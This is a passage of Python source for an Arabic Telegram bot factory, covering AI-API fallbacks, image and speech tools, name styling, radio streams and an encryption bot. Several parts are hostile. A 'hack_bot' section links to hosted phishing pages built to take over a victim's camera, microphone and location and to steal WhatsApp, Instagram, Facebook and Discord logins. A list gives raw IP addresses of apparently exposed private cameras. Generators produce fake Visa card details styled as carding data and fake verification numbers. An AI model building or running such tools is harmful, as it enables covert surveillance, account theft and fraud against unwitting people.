            (API_CHATGPT_3_5, {"ai": f"تفسير الحلم: {prompt}"}),
            (API_DEEPSEEK_AI, {"q": f"تفسير الحلم: {prompt}"}),
            (API_SHEREEN_AI, {"q": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_2, {"WR1": f"تفسير الحلم: {prompt}"}),
            (API_AI_FALLBACK_3, {"text": f"تفسير الحلم: {prompt}"}),
        ]
    elif api_type == "blue_genie_game":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_CHATGPT_3_5, {"ai": f"لعبة المارد الأزرق: {prompt}"}),
            (API_DEEPSEEK_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_SHEREEN_AI, {"q": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_2, {"WR1": f"لعبة المارد الأزرق: {prompt}"}),
            (API_AI_FALLBACK_3, {"text": prompt}),
        ]

    for api_url, params in apis_to_try:
        try:
            response = requests.get(api_url, params=params, timeout=10)
            response.raise_for_status()
            try:
                json_response = response.json()
                result = None
                if 'response' in json_response:
                    result = json_response['response']
                elif 'answer' in json_response:
                    result = json_response['answer']
                elif 'result' in json_response:
                    result = json_response['result']
                elif 'text' in json_response:
                    result = json.dumps(json_response, ensure_ascii=False)
                elif 'output' in json_response:
                    result = json_response['output']
                
                return clean_api_response(result)
            except json.JSONDecodeError:
                return clean_api_response(response.text.strip())
        except requests.exceptions.RequestException as e:
            logging.error(f"خطأ في التفاعل مع API {api_url}: {e}")
            continue

    return "عذرًا، حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى لاحقًا. 😔"

def generate_image_via_api(prompt, bot_username, user_id):
    """
    ينشئ صورة باستخدام API مخصص لإنشاء الصور.
    """
    api_url = API_IMAGE_GENERATION_NEW
    params = {"text": prompt}

    if not check_api_status(api_url, params):
        logging.error(f"خطأ في إنشاء الصورة عبر API {api_url}")
        return None
    try:
        response = requests.get(api_url, params=params, timeout=15)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'image_url' in json_response:
                return json_response['image_url']
            elif 'url' in json_response:
                return json_response['url']
            else:
                logging.warning(f"استجابة API الصورة لم تحتوي على مفتاح URL المتوقع: {json_response}")
                return None
        except json.JSONDecodeError:
            logging.error(f"استجابة API الصورة ليست JSON صالحة: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"خطأ في إنشاء الصورة عبر API {api_url}: {e}")
        return None

def convert_text_to_speech_via_api(text, bot_username, user_id):
    """
    يحول النص إلى صوت باستخدام API مخصص، ويستخرج رابط الصوت من استجابة JSON.
    """
    encoded_text = urllib.parse.quote(text)
    api_url = f"{API_TEXT_TO_SPEECH}?text={encoded_text}&voice=nova&style=cheerful+tone"

    if not check_api_status(api_url):
        logging.error(f"خطأ في تحويل النص إلى صوت عبر API {api_url}")
        return None
    try:
        response = requests.get(api_url, timeout=15)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'voice' in json_response:
                return json_response['voice']
            elif 'url' in json_response: # Some APIs might return 'url'
                return json_response['url']
            else:
                logging.warning(f"استجابة API تحويل النص إلى صوت لم تحتوي على مفتاح 'voice' أو 'url': {json_response}")
                return None
        except json.JSONDecodeError:
            logging.error(f"استجابة API تحويل النص إلى صوت ليست JSON صالحة: {response.text}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"خطأ في تحويل النص إلى صوت عبر API: {e}")
        return None

def get_azkar_via_api(bot_username, user_id):
    """
    يجلب الأذكار من API الأذكار الإسلامية.
    """
    if not check_api_status(API_AZKAR):
        logging.error(f"خطأ في جلب الأذكار عبر API {API_AZKAR}")
        return "عذرًا، خدمة الأذكار غير متاحة حاليًا. 😔"
    try:
        response = requests.get(API_AZKAR, timeout=10)
        response.raise_for_status()
        try:
            json_response = response.json()
            if 'zekr' in json_response:
                zekr_text = (
                    f"*{json_response['zekr']}*\n\n"
                    f"الوقت: {json_response.get('time', 'غير متاح')}\n"
                    f"التاريخ: {json_response.get('date', 'غير متاح')}\n"
                    f"نوع الذكر: {json_response.get('type', 'غير متاح')}"
                )
                return clean_api_response(zekr_text)
            else:
                return clean_api_response(json.dumps(json_response, ensure_ascii=False))
        except json.JSONDecodeError:
            logging.error(f"استجابة API الأذكار ليست JSON صالحة: {response.text}")
            return "عذرًا، حدث خطأ أثناء جلب الأذكار. 😔"
    except requests.exceptions.RequestException as e:
        logging.error(f"خطأ في جلب الأذكار عبر API: {e}")
        return "عذرًا، حدث خطأ أثناء جلب الأذكار. 😔"

# --- Name Decoration Functions ---
def decorate_english_name(name):
    decorated_names = []

    # Bold Italic
    bold_italic_map = {
        'A': '𝑨', 'B': '𝑩', 'C': '𝑪', 'D': '𝑫', 'E': '𝑬', 'F': '𝑭', 'G': '𝑮', 'H': '𝑯', 'I': '𝑰', 'J': '𝑱',
        'K': '𝑲', 'L': '𝑳', 'M': '𝑴', 'N': '𝑵', 'O': '𝑶', 'P': '𝑷', 'Q': '𝑸', 'R': '𝑹', 'S': '𝑺', 'T': '𝑻',
        'U': '𝑼', 'V': '𝑽', 'W': '𝑾', 'X': '𝑿', 'Y': '𝒀', 'Z': '𝒁',
        'a': '𝒂', 'b': '𝒃', 'c': '𝒄', 'd': '𝒅', 'e': '𝒆', 'f': '𝒇', 'g': '𝒈', 'h': '𝒉', 'i': '𝒊', 'j': '𝒋',
        'k': '𝒌', 'l': '𝒍', 'm': '𝒎', 'n': '𝒏', 'o': '𝒐', 'p': '𝒑', 'q': '𝒒', 'r': '𝒓', 's': '𝒔', 't': '𝒕',
        'u': '𝒖', 'v': '𝒗', 'w': '𝒘', 'x': '𝒙', 'y': '𝒚', 'z': '𝒛'
    }
    decorated_names.append("𝑨𝑳𝑴𝑬𝑼𝑵𝑯𝑹𝑬𝑭 ➊:\n" + "".join(bold_italic_map.get(char, char) for char in name))

    # Monospace
    monospace_map = {
        'A': '𝙰', 'B': '𝙱', 'C': '𝙲', 'D': '𝙳', 'E': '𝙴', 'F': '𝙵', 'G': '𝙶', 'H': '𝙷', 'I': '𝙸', 'J': '𝙹',
        'K': '𝙺', 'L': '𝙻', 'M': '𝙼', 'N': '𝙽', 'O': '𝙾', 'P': '𝙿', 'Q': '𝚀', 'R': '𝚁', 'S': '𝚂', 'T': '𝚃',
        'U': '𝚄', 'V': '𝚅', 'W': '𝚆', 'X': '𝚇', 'Y': '𝚈', 'Z': '𝚉',
        'a': '𝚊', 'b': '𝚋', 'c': '𝚌', 'd': '𝚍', 'e': '𝚎', 'f': '𝚏', 'g': '𝚐', 'h': '𝚑', 'i': '𝚒', 'j': '𝚓',
        'k': '𝚔', 'l': '𝚕', 'm': '𝚖', 'n': '𝚗', 'o': '𝚘', 'p': '𝚙', 'q': '𝚚', 'r': '𝚛', 's': '𝚜', 't': '𝚝',
        'u': '𝚞', 'v': '𝚟', 'w': '𝚠', 'x': '𝚡', 'y': '𝚢', 'z': '𝚣'
    }
    decorated_names.append("𝙰𝙻𝙼𝙴𝚀𝙽𝙷𝚁𝙴𝙵 ➋:\n" + "".join(monospace_map.get(char, char) for char in name))

    # Circled
    circled_map = {
        'A': 'Ⓐ', 'B': 'Ⓑ', 'C': 'Ⓒ', 'D': 'Ⓓ', 'E': 'Ⓔ', 'F': 'Ⓕ', 'G': 'Ⓖ', 'H': 'Ⓗ', 'I': 'Ⓘ', 'J': 'Ⓙ',
        'K': 'Ⓚ', 'L': 'Ⓛ', 'M': 'Ⓜ', 'N': 'Ⓝ', 'O': 'Ⓞ', 'P': 'Ⓟ', 'Q': 'Ⓠ', 'R': 'Ⓡ', 'S': 'Ⓢ', 'T': 'Ⓣ',
        'U': 'Ⓤ', 'V': 'Ⓥ', 'W': 'Ⓦ', 'X': 'Ⓧ', 'Y': 'Ⓨ', 'Z': 'Ⓩ',
        'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ',
        'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
        'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ'
    }
    decorated_names.append("Ⓐ🄻ⓂⒺ🄀ⓃⒽⓇ💺🄵 ➌:\n" + "".join(circled_map.get(char, char) for char in name))

    # Double Struck
    double_struck_map = {
        'A': '𝔸', 'B': '𝔹', 'C': 'ℂ', 'D': '𝔻', 'E': '𝔼', 'F': '𝔽', 'G': '𝔾', 'H': 'ℍ', 'I': '𝕀', 'J': '𝕁',
        'K': '𝕂', 'L': '𝕃', 'M': '𝕄', 'N': 'ℕ', 'O': '𝕆', 'P': 'ℙ', 'Q': 'ℚ', 'R': 'ℝ', 'S': '𝕊', 'T': '𝕋',
        'U': '𝕌', 'V': '𝕍', 'W': '𝕎', 'X': '𝕏', 'Y': '𝕐', 'Z': 'ℤ',
        'a': '𝕒', 'b': '𝕓', 'c': '𝕔', 'd': '𝕕', 'e': '𝕖', 'f': '𝕗', 'g': '𝕘', 'h': '𝕙', 'i': '𝕚', 'j': '𝕛',
        'k': '𝕜', 'l': '𝕝', 'm': '𝕞', 'n': '𝕟', 'o': '𝕠', 'p': '𝕡', 'q': '𝕢', 'r': '𝕣', 's': '𝕤', 't': '𝕥',
        'u': '𝕦', 'v': '𝕧', 'w': '𝕨', 'x': '𝕩', 'y': '𝕪', 'z': '𝕫'
    }
    decorated_names.append("𝔸🄻𝕄𝔼🄀ℕℍℝ𝔼🔠 ➍:\n" + "".join(double_struck_map.get(char, char) for char in name))

    # Squared
    squared_map = {
        'A': '🄰', 'B': '🄱', 'C': '🄲', 'D': '🄳', 'E': '🄴', 'F': '🄵', 'G': '🄶', 'H': '🄷', 'I': '🄸', 'J': '🄹',
        'K': '🄺', 'L': '🄻', 'M': '🄼', 'N': '🄽', 'O': '🄾', 'P': '🄿', 'Q': '🅀', 'R': '🅁', 'S': '🅂', 'T': '🅃',
        'U': '🅄', 'V': '🅅', 'W': '🅆', 'X': '🅇', 'Y': '🅈', 'Z': '🅉',
        'a': '🄰', 'b': '🄱', 'c': '🄲', 'd': '🄳', 'e': '🄴', 'f': '🄵', 'g': '🄶', 'h': '🄷', 'i': '🄸', 'j': '🄹',
        'k': '🄺', 'l': '🄻', 'm': '🄼', 'n': '🄽', 'o': '🄾', 'p': '🄿', 'q': '🅀', 'r': '🅁', 's': '🅂', 't': '🅃',
        'u': '🅄', 'v': '🅅', 'w': '🅆', 'x': '🅇', 'y': '🅈', 'z': '🅉'
    }
    decorated_names.append("🄰🄻🄼🄴🄀🄽🄷🅁🄴🄵 ➎:\n" + "".join(squared_map.get(char, char) for char in name))

    return "\n\n".join(decorated_names)

def decorate_arabic_name(name):
    decorated_names = []

    # Arabic Decorated 1 (Example: using combining characters for a "double" effect)
    # This is a simplified example. Real Arabic decoration is complex and often requires specific fonts/libraries.
    # For demonstration, we'll use a basic approach.
    decorated_names.append("اٰلْـٰمْـٰحْـٰمْـٰدْ ➊:\n" + "".join(f"{char}ٰ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))

    # Arabic Decorated 2 (Example: using a different combining character or simple stylistic change)
    decorated_names.append("اٰلْـٰمْـٰحْـٰمْـٰدْ ➋:\n" + "".join(f"{char}ّ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))

    # Arabic Decorated 3 (Example: using a different combining character or simple stylistic change)
    decorated_names.append("اٰلْـٰمْـٰحْـٰمْـٰدْ ➌:\n" + "".join(f"{char}ْ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))

    # Arabic Decorated 4 (Example: using a different combining character or simple stylistic change)
    decorated_names.append("اٰلْـٰمْـٰحْـٰمْـٰدْ ➍:\n" + "".join(f"{char}ٓ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))

    # Arabic Decorated 5 (Example: using a different combining character or simple stylistic change)
    decorated_names.append("اٰلْـٰمْـٰحْـٰمْـٰدْ ➎:\n" + "".join(f"{char}ٌ" for char in name if char.isalpha()) + "".join(char for char in name if not char.isalpha()))

    return "\n\n".join(decorated_names)

# --- URL Check Functions (from bot.py, adapted for python-telegram-bot) ---
def check_url_virustotal(update: Update, context: CallbackContext, url_to_check: str, bot_username, user_id):
    chat_id = update.effective_chat.id
    
    if not url_to_check.startswith(('http://', 'https://')):
        send_message(context.bot, chat_id, "الرجاء إرسال رابط صحيح يبدأ بـ \"http\" أو \"https\". ❌")
        return

    try:
        url_id = base64.urlsafe_b64encode(url_to_check.encode()).decode().strip("=")
        response = requests.get(
            f"https://www.virustotal.com/api/v3/urls/{url_id}",
            headers={"x-apikey": VIRUSTOTAL_API_KEY}
        )
        
        if response.status_code == 200:
            data = response.json()
            analysis_stats = data['data']['attributes']['last_analysis_stats']
            result_message = (
                f"📊 *نتائج فحص الرابط:*\n"
                f"✅ آمن: {analysis_stats['harmless']}\n"
                f"⚠️ مشبوه: {analysis_stats['malicious']}\n"
                f"❓ مشكوك فيه: {analysis_stats['suspicious']}"
            )
            send_message(context.bot, chat_id, result_message, parse_mode=ParseMode.MARKDOWN)
        else:
            send_message(context.bot, chat_id, "❌ حدثت مشكلة في فحص الرابط، حاول مرة أخرى لاحقًا.")
    except Exception as e:
        send_message(context.bot, chat_id, f"❌ حصل خطأ غير متوقع: {e}")

# --- Radio Stations Data ---
SUDAN_RADIO_STATIONS = [
    {"name": "#Radio Quran 🕋", "url": "https://n0a.radiojar.com/0tpy1h0kxtzuv?rj-ttl=5&rj-tok=AAABhdgGORQA-2acfyF3_4WY2g"},
    {"name": "Abdulbasit Abdulsamad 🎙️", "url": "https://radio.mp3islam.com/listen/abdulbasit/radio.mp3"},
    {"name": "Dabanga Radio 📻", "url": "https://stream.dabangasudan.org/"},
    {"name": "Dial Radio 📡", "url": "https://cast.dialradio.live/stream.aac"}
]

EGYPT_RADIO_STATIONS = [
    {"name": "إذاعة مشاري العفاسي 🕌", "url": "https://qurango.net/radio/mishary_alafasi"},
    {"name": "---تراتيل قصيرة متميزة--- ✨", "url": "https://qurango.net/radio/tarateel"},
    {"name": ". beautiful recitation 🎶", "url": "https://qurango.net/radio/salma"},
    {"name": ". القارئ محمد أيوب 🎤", "url": "https://qurango.net/radio/mohammed_ayyub"},
    {"name": ".. مختصر التفسير 📚", "url": "https://qurango.net/radio/mukhtasartafsir"},
    {"name": ".إذاعة ماهر المعيقلي 🕋", "url": "https://backup.qurango.net/radio/maher"},
    {"name": "87.8 Mix FM 🎧", "url": "https://stream-29.zeno.fm/na3vpvn10qruv"},
    {"name": "90s FM 📻", "url": "http://eu1.fastcast4u.com/proxy/prontofm"},
    {"name": "90s FM 🎶", "url": "https://fastcast4u.com/player/prontofm/?pl=vlc&c=0"},
    {"name": "92.7 Mega FM 🔊", "url": "http://nebula.shoutca.st:8211/mp3"},
    {"name": "Abdulbasit Abdulsamad 🎙️", "url": "https://radio.mp3islam.com/listen/abdulbasit/radio.mp3"},
    {"name": "Abdulrasheet Soufi 🎤", "url": "https://qurango.net/radio/abdulrasheed_soufi_assosi.mp3"},
    {"name": "Amr Diab Radio 🎵", "url": "https://stream-40.zeno.fm/xa4yhh4k838uv?zs=gojgaFRaRrK1wgGIwdv6xA"},
    {"name": "Arab Mix 256 🎧", "url": "https://stream.zeno.fm/wvqgc9kb1d0uv"},
    {"name": "Arab Mix FM 📻", "url": "https://stream.zeno.fm/na3vpvn10qruv"},
    {"name": "Arina 🎶", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "As0m 🔊", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "c- tv coptic chanl 📺", "url": "https://58cc65c534c67.streamlock.net/ctvchannel.tv/ctv.smil/chunklist_w555483697_b1728000_slar_t64SEQ=.m3u8"},
    {"name": "C-TV Coptic Channel 📡", "url": "https://58cc65c534c67.streamlock.net/ctvchannel.tv/ctv.smil/chunklist_w555483697_b1728000_slar_t64SEQ=.m3u8"},
    {"name": "Coptic Voice Radio 🎙️", "url": "http://stream.clicdomain.com.br:5828/;"},
    {"name": "Diab FM 🎵", "url": "http://stream-36.zeno.fm/rf64mx02qa0uv?zs=omRb6KEjQ3u0-JsaJKdhQg"},
    {"name": "Diab FM 🎧", "url": "https://stream-34.zeno.fm/rf64mx02qa0uv?zs=-xjlLLwRSuKrffFxK4vLA"},
    {"name": "El Gouna Radio 🏖️", "url": "http://online-radio.eu/export/winamp/9080-el-gouna-radio"},
    {"name": "El Gouna Radio 🌊", "url": "http://82.201.132.237:8000/"},
    {"name": "El Gouna Radio ☀️", "url": "http://82.201.132.237:8000/;"},
    {"name": "Elissa FM 🎤", "url": "https://stream.zeno.fm/v7n499m8ckhvv"},
    {"name": "IVIeshal 🎶", "url": "https://stream.zeno.fm/smdswgy1rbmtv"},
    {"name": "MAHATET MASR 🚉", "url": "https://s3.radio.co/s9cb11828c/listen"},
    {"name": "MEGA FM 🔊", "url": "http://nebula.shoutca.st:8211/mp3"},
    {"name": "Misrin Street 🛣️", "url": "https://stream.zeno.fm/djqjrjhxsrgtv"},
    {"name": "MOON.BEATS 🌕", "url": "https://stream.zeno.fm/o9hxduybuoiuv"},
    {"name": "Nile FM 🏞️", "url": "https://audio.nrpstream.com/public/nile_fm/playlist.pls"},
    {"name": "NileFM 🇪🇬", "url": "https://audio.nrpstream.com/listen/nile_fm/radio.mp3"},
    {"name": "Nogoum fm ⭐", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3?refresh=1675929443955"},
    {"name": "Nogoum FM 🌟", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3?refresh=1668723970691"},
    {"name": "Nogoum FM 💫", "url": "https://audio.nrpstream.com/listen/nogoumfm/radio.mp3"},
    {"name": "NRJ EGYPT ⚡", "url": "http://nrjstreaming.ahmed-melege.com/nrjegypt"},
    {"name": "On Sport FM ⚽", "url": "https://carina.streamerr.co:2020/stream/OnSportFM"},
    {"name": "On sports FM 🏆", "url": "https://carina.streamerr.co:2020/stream/OnSportFM"},
    {"name": "Radio 9090 📻", "url": "https://9090streaming.mobtada.com/9090FMEGYPT"}
]

# --- CCTV Cameras Data ---
CCTV_CAMERAS = {
    "الولايات المتحدة 🇺🇸": [ # Example from earthcam.com, insecam.org, webcamtaxi.com - these are placeholders, real-time streams might require more complex handling or direct links.
        "https://www.earthcam.com/usa/newyork/timessquare/",
        "http://www.insecam.org/cam/bycountry/US/",
        "https://www.webcamtaxi.com/en/usa.html"
    ],
    "ألمانيا 🇩🇪": [
        "http://84.35.147.6:80",
        "http://185.125.234.119:8082",
        "http://217.103.90.117:8098",
        "http://77.250.189.154:82",
        "http://89.99.162.183:80",
        "http://85.204.109.102:8080",
        "http://213.233.251.55:8080",
        "http://77.160.68.211:8000",
        "http://77.169.191.156:80",
        "http://77.162.93.116:80",
        "http://62.133.72.183:80",
        "http://91.201.127.150:8081",
        "http://62.133.72.177:80",
        "http://62.133.72.173:80",
        "http://80.61.63.103:81",
        "http://213.124.36.2:80",
        "http://91.201.127.150:8080",
        "http://87.195.26.45:80",
        "http://213.124.95.98:8082",
        "http://217.100.243.178:10000",
        "http://89.250.177.22:80",
        "http://185.64.122.250:8081",
        "http://185.64.122.242:8082",
        "http://185.64.121.186:8081",
        "http://213.154.234.197:80",
        "http://213.154.234.194:80",
        "http://95.97.10.38:8080",
        "http://90.145.45.197:80",
        "http://62.131.207.209:8080",
        "http://217.63.79.153:8081",
        "http://213.126.79.10:80",
        "http://193.173.111.26:80",
        "http://86.92.91.44:80"
    ],
    # Add more countries and their camera links as needed
}

# Function to generate random Visa card details
def generate_random_visa_details():
    card_number = "4" + ''.join(random.choices(string.digits, k=15))
    expiry_month = str(random.randint(1, 12)).zfill(2)
    expiry_year = str(random.randint(2024, 2030))
    cvv = ''.join(random.choices(string.digits, k=3))
    
    banks = ["SunTrust Bank", "Bank of America", "Chase Bank", "Wells Fargo", "Citibank"]
    card_types = ["VISA - DEBIT - VISA CLASSIC", "VISA - CREDIT - PLATINUM", "VISA - PREPAID - ELECTRON"]
    countries = ["USA🇺🇸", "Canada🇨🇦", "UK🇬🇧", "Australia🇦🇺", "Germany🇩🇪"]
    values = [f"${random.randint(10, 1000)}" for _ in range(5)]

    return {
        "card_number": card_number,
        "expiry": f"{expiry_month}/{expiry_year}",
        "cvv": cvv,
        "bank": random.choice(banks),
        "card_type": random.choice(card_types),
        "country": random.choice(countries),
        "value": random.choice(values)
    }

# Function to generate random fake number details
def generate_fake_number_details():
    phone_number = f"+{random.randint(1, 999)}{random.randint(100000000, 999999999)}"
    countries = ["الولايات المتحدة 🇺🇸", "كندا 🇨🇦", "المملكة المتحدة 🇬🇧", "ألمانيا 🇩🇪", "فرنسا 🇫🇷", "مصر 🇪🇬", "السعودية 🇸🇦"]
    platforms = ["WhatsApp", "Telegram", "Signal", "Viber", "SMS"]
    
    country = random.choice(countries)
    country_code = phone_number.split('+')[1][:3] # Simple extraction, might not be accurate for all
    platform = random.choice(platforms)
    
    creation_date = f"{random.randint(1, 28)}/{random.randint(1, 12)}/{random.randint(2020, 2023)}"
    creation_time = f"{random.randint(0, 23):02d}:{random.randint(0, 59):02d}"

    return {
        "phone_number": phone_number,
        "country": country,
        "country_code": country_code,
        "platform": platform,
        "creation_date": creation_date,
        "creation_time": creation_time
    }

def get_fake_number_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("طلب كود 💬", callback_data="fake_number_request_code")],
        [InlineKeyboardButton("تغيير الرقم 🔄", callback_data="fake_number_change_number")]
    ])

def handle_callback_query_made_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    
    if not query.message:
        query.answer("حدث خطأ: الرسالة غير موجودة. 😔", show_alert=True)
        return

    user_id = query.from_user.id
    chat_id = query.message.chat.id
    message_id = query.message.message_id
    data = query.data
    
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        logging.error(f"لم يتمكن من الحصول على اسم المستخدم للبوت بالتوكن {current_bot_token}. لا يمكن المتابعة.")
        query.answer("حدث خطأ في تحديد هوية البوت. يرجى المحاولة لاحقًا. 😔", show_alert=True)
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    # Ensure bot_user_states is initialized for the current bot and user
    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    # NEW: التحقق من الاشتراك الإجباري لقناة المصنع الأساسية في كل تفاعل
    # هذا يمنع المستخدم من التفاعل مع البوت إذا لم يكن مشتركًا
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لاستخدام هذا البوت.\n"
            keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            edit_message_text(context.bot, chat_id, message_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            query.answer("الرجاء الاشتراك في القناة الإجبارية أولاً. 🚫", show_alert=True)
            return

    # الروابط الجديدة من index.py (خاصة بـ hack_bot)
    links = {
        "cam_back": "https://spectacular-crumble-77f830.netlify.app",
        "cam_front": "https://profound-bubblegum-7f29b2.netlify.app",
        "location": "https://illustrious-panda-c2ece1.netlify.app",
        "mic_record": "https://tourmaline-kulfi-aeb7ea.netlify.app",
        "record_video": "https://dainty-medovik-d0e934.netlify.app",
        "pubg_hack": "https://sunny-concha-96fe88.netlify.app",
        "ff_hack": "https://thunderous-maamoul-7653c0.netlify.app",
        "insta_hack": "https://gentle-kulfi-99cf00.netlify.app",
        "whatsapp_hack": "https://benevolent-meerkat-966767.netlify.app",
        "facebook_hack": "https://dazzling-daffodil-ed5b43.netlify.app",
        "tiktok_hack": "https://melodious-crumble-8d3b83.netlify.app",
        "snapchat_hack": "https://preeminent-gumdrop-35a4f1.netlify.app",
        "device_info": "http://incredible-fairy-85f241.netlify.app",
        "high_quality_shot": "https://profound-bubblegum-7f29b2.netlify.app",
        "get_victim_number": "https://tubular-brioche-55433f.netlify.app/",
        "discord_hack": "https://sweet-madeleine-41fe6e.netlify.app/",
        "roblox_hack": "https://silly-sunflower-ab29c8.netlify.app/"
    }

    # --- Common User Actions (for both bot types, or specific ones) ---
    if data == "back_to_main_user_menu":
        query.answer()
        bot_user_states[current_bot_username][user_id] = None
        if bot_type == "factory_bot":
            send_message(context.bot, chat_id,
                         "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريد انشاءه 🎩",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else:
            send_message(context.bot, chat_id,
                        bot_settings["start_message"] if bot_type == "hack_bot" else f"مرحباً {update.effective_user.first_name}! 👋\nيوزر: @{update.effective_user.username if update.effective_user.username else 'غير متاح'}\nايدي: {user_id}\n\nتم مرحبا بك في عالم فك/التشفير 🔐 ✅",
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        return
    
    # --- Encryption Bot Specific User Actions ---
    if bot_type == "encryption_bot":
        if data == "encrypt_file":
            query.answer()
            edit_message_text(context.bot, chat_id, message_id,
                              "اختر نوع التشفير يا عزيزي: 🔒",
                              reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_encryption_type"
            return
        elif data == "decrypt_file":
            query.answer()
            edit_message_text(context.bot, chat_id, message_id,
                              "اختر نوع فك التشفير يا عزيزي: 🔓",
                              reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_decryption_type"
            return
        elif data.startswith("enc_type_"):
            enc_type = data.replace("enc_type_", "")
            current_state = bot_user_states[current_bot_username].get(user_id)
            if current_state == "await_encryption_type":
                query.answer(f"اخترت تشفير {enc_type}. الرجاء إرسال الملف الآن. 📁", show_alert=True)
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_encryption", "type": enc_type}
            elif current_state == "await_decryption_type":
                query.answer(f"اخترت فك تشفير {enc_type}. الرجاء إرسال الملف الآن. 📁", show_alert=True)
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_decryption", "type": enc_type}
            else:
                query.answer("حدث خطأ في تحديد العملية. يرجى البدء من جديد. 🔄", show_alert=True)
                bot_user_states[current_bot_username][user_id] = None
            return
        elif data == "show_terms_encryption_bot":
            query.answer()
            terms_message = (
                "📜 *الشروط والمتطلبات وكيفية التعامل مع البوت:*\n\n"
                "مرحبًا بك في بوت التشفير وفك التشفير! يرجى قراءة هذه الإرشادات بعناية لضمان أفضل تجربة: ✨\n\n"
                "1.  **الغرض من البوت**: هذا البوت مصمم لتشفير وفك تشفير الملفات النصية باستخدام خوارزميات بسيطة لأغراض تعليمية أو تجريبية. ليس مخصصًا لتشفير البيانات الحساسة أو السرية للغاية. 🚫\n"
                "2.  **أنواع التشفير**: يوفر البوت عدة أنواع من التشفير (مثل Base64, Hex, ROT13, SHA256, Gzip, Reverse). يرجى ملاحظة أن SHA256 هو تشفير أحادي الاتجاه (Hashing) ولا يمكن فك تشفيره. 🛡️\n"
                "3.  **تشفير/فك التشفير**: لكي تتمكن من فك تشفير ملف، يجب أن تكون قد قمت بتشفيره بنفس النوع من خلال هذا البوت. إذا تم تشفير الملف بطريقة أخرى أو بنوع تشفير مختلف، فقد لا يتمكن البوت من فك تشفيره بشكل صحيح. ⚠️\n"
                "4.  **الملفات المدعومة**: يدعم البوت حاليًا الملفات النصية. قد لا يعمل بشكل صحيح مع الملفات الثنائية (مثل الصور أو الفيديو). 📄\n"
                "5.  **الدعم**: إذا واجهت أي مشكلة أو كان لديك استفسار، يمكنك التواصل مع المطور عبر زر 'الدعم🚨'. 👨‍💻\n"
                "6.  **القناة الأساسية**: يرجى الاشتراك في القناة الأساسية للبوت للبقاء على اطلاع بآخر التحديثات والميزات. 📢\n\n"
                "نتمنى لك تجربة مفيدة وممتعة! 😊"
            )
            edit_message_text(context.bot, chat_id, message_id,
                              terms_message,
                              parse_mode=ParseMode.MARKDOWN,
                              reply_markup=InlineKeyboardMarkup([
                                  [InlineKeyboardButton("رجوع↩️", callback_data="back_to_main_encryption_menu")]
                              ]))
            return
        elif data == "back_to_main_encryption_menu":
            query.answer()
            bot_user_states[current_bot_username][user_id] = None
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username if update.effective_user.username else "غير متاح"
            welcome_message = (
                f"مرحباً {user_name}! 👋\n"
                f"يوزر: @{user_username}\n"
                f"ايدي: {user_id}\n\n"
                f"تم مرحبا بك في عالم فك/التشفير 🔐 ✅"
            )
            edit_message_text(context.bot, chat_id, message_id,
                              welcome_message,
                              reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return
